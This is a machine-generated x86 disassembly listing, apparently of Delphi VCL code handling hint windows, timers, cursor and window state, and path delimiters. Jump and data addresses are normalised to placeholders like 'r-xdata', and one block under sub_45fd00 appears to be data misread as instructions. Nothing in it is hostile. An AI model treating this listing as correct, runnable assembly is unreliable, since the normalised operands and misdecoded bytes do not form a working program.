mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_45f53c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ef08
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_4191e0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f0fb
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fe0
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_45f104
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_45c498
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45c484
movzx edx di
xor ecx ecx
call sub_43f0c4
inc esi
dec ebx
jne r-xdata
sub_45f140
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45e25c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45e25c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_45f104
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_45f1a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4043c8
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_404010
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_437930
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a9f8
xor eax eax
push ebp
push sub_45f229
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_45f238
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_45f294
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_45c498
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_45f238
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45c484
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_45f238
pop ecx
jmp r-xdata
mov eax ebx
call sub_4449fc
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_4446f8
push eax
call IsChild
test eax eax
jne r-xdata
sub_45f31c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405628
call sub_42487c
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_45f344
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_45f388
push sub_45d074
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_45f53c
sub_45f3b0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406980
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43d9dc
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43c770
call sub_45d054
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_45f53c
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406980
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43d9dc
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_45f53c
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_45f344
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_43f0c4
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_45f7d4
jmp r-xdata
sub_45f4c0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45f388
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_45f7d4
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_45f4f8
jmp r-xdata
sub_45f4f8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4449fc
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4446f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_4446f8
push eax
call ShowWindow
sub_45f53c
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45f4f8
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_45d1dc
mov eax ebx
call sub_45f388
sub_45f574
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_45f6b6
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_41e8c8
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407ac8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_45f687
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_41e980
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f68e
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_45f564
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_45f564
mov [ ebp - 0x4 ] eax
sub_45f68e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_45f6c8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_40326c
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4031b4
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_45f728
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_45f7c2
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f7c9
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4040ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_41d488
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40bff8
mov ebx eax
inc ebx
sub_45f7d4
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404928
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_45fb5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45f53c
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45f344
jmp r-xdata
call sub_45590c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fb61
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4049f8
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_43c770
call sub_45d054
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_45f574
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_45c418
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43d864
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43da08
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_45d01c
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43af90
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_404054
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_43f0c4
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_45f6c8
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403468
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43d9dc
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43d9dc
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_43e064
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_45d168
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_45f728
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_45f344
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_45f344
jmp r-xdata
sub_45fb68
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_404010
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_404010
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45fba4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_43f0c4
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_43f0c4
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44a8c0
sub_45fc34
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_45fc5c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_45fd00
add [ eax ] eax
add [ eax ] al
or ch bl
inc esi
add [ esp + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45fd63
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fd6a
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4556b8
mov eax sub_455938
call sub_4134fc
mov eax [ rw-data ]
push eax
call CloseHandle
sub_45fdd4
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x0
mov eax esi
call sub_40427c
cmp edi eax
jg r-xdata
mov eax esi
call sub_40427c
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
mov [ esp ] al
mov edx edi
mov eax esi
call sub_40bdc8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esi + edi - 0x2 ] 0x5c
jne r-xdata
mov eax esi
call sub_40427c
cmp eax 0x4
jl r-xdata
mov eax esi
call sub_40427c
cmp eax 0x4
jl r-xdata
mov edx edi
dec edx
mov eax esi
call sub_40bdc8
test al al
jne r-xdata
mov al [ esp ]
sub al 0x2f
je r-xdata
mov eax esi
call sub_40427c
sub eax 0x4
cmp edi eax
jle r-xdata
mov eax esi
call sub_40427c
sub eax 0x4
cmp edi eax
jle r-xdata
cmp edi 0x2
jle r-xdata
mov bl 0x2
jmp r-xdata
sub al 0xb
jne r-xdata
mov al [ esi + edi - 0x2 ]
cmp al [ rw-data ]
jne r-xdata
mov bl 0x6
jmp r-xdata
mov bl 0x1
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
mov al [ esp ]
sub al 0x21
je r-xdata
cmp edi 0x2
jle r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40bdc8
test al al
je r-xdata
mov bl 0x3
jmp r-xdata
sub al 0x1b
je r-xdata
mov bl 0x7
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
sub al 0x2
je r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40bdc8
cmp al 0x2
jne r-xdata
sub al 0x1e
jne r-xdata
mov al [ esp ]
sub al 0x23
je r-xdata
mov bl 0x5
jmp r-xdata
sub al 0x16
je r-xdata
sub al 0x28
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
mov al [ esp ]
sub al 0x30
je r-xdata
mov bl 0x4
sub al 0x11
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
sub_45ff28
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov bl [ r-xdata ]
mov eax edi
call sub_40427c
mov esi eax
test esi esi
jle r-xdata
mov edx [ esp ]
mov eax edi
call sub_45fdd4
cmp al 0x1
jne r-xdata
mov ebp 0x1
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or bl 0x8
cmp al 0x3e
jne r-xdata
or bl 0x1
jmp r-xdata
cmp al 0x3c
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
inc ebp
dec esi
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
and bl 0xfb
cmp ebp 0x1
jle r-xdata
mov al [ edi + ebp - 0x1 ]
cmp al 0x21
jne r-xdata
and bl 0xfd
or bl 0x4
or bl 0x2
jmp r-xdata
cmp [ edi + ebp - 0x2 ] 0x3c
je r-xdata
sub_45ffa4
mov edx eax
sub al 0x2f
je r-xdata
mov edx [ rw-data ]
mov dl [ edx ]
sub al 0xb
jne r-xdata
mov eax edx
retn
mov edx [ rw-data ]
mov dl [ edx ]
mov eax edx
retn
sub_45ffc4
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4601ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx esi
call sub_404010
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45ff28
mov [ ebp - 0x11 ] al
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebx ]
call sub_40427c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_40427c
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_40427c
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4601d5
lea eax [ ebp - 0x38 ]
mov edx 0x8
call sub_403fe0
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] eax
mov esi 0x1
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0x10 ]
mov edx 0x1
call sub_4044dc
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_45ffa4
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_4041a4
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx ]
call sub_40427c
mov ecx eax
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
inc edx
mov eax [ ebx ]
call sub_4044dc
push [ ebp - 0x34 ]
mov eax ebx
mov edx 0x3
call sub_40433c
jmp r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_4044dc
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_45ffa4
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_4041a4
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
call sub_40427c
mov ecx eax
sub ecx [ ebp - 0x10 ]
inc ecx
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
call sub_4044dc
push [ ebp - 0x24 ]
mov eax ebx
mov edx 0x3
call sub_40433c
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx ]
call sub_40427c
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_40427c
mov esi eax
sub esi [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45fdd4
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x5 ]
call sub_4041a4
mov edx [ ebp - 0x38 ]
mov ecx [ ebx ]
mov eax ebx
call sub_4042c8
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45fdd4
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
jmp r-xdata
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x28 ]
mov dl [ ebp - 0x5 ]
call sub_4041a4
mov edx [ ebp - 0x28 ]
mov eax ebx
call sub_404284
sub_4601e0
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov [ esp ] 0x1
mov eax esi
call sub_40427c
cmp eax 0x4
jl r-xdata
mov al [ esp ]
pop edx
pop ebp
